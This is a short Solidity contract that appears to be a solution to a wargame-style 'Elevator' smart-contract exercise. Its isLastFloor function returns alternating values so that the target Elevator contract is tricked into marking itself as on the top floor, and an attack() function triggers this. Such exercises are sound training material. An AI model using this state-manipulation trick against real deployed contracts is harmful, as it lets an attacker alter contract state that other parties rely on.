// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../../../Exercise/Stage1/11/Elevator.sol";

contract ConcreteBuilding is Building {
    //    safe math
    address private userAddress;
    Elevator elevator;
    uint256 count = 0;

    constructor(address inputUserAddress) public {
        userAddress = inputUserAddress;
    }

    function attack(uint topFloor) public {
        elevator.goTo(topFloor);
    }

    function setContract(Elevator importingElevator) external {
        elevator = importingElevator;
    }


    function isLastFloor(uint) public override returns (bool) {
        count ++;
        if (count % 2 == 0) {
            return true;
        }
        return false;
    }

}
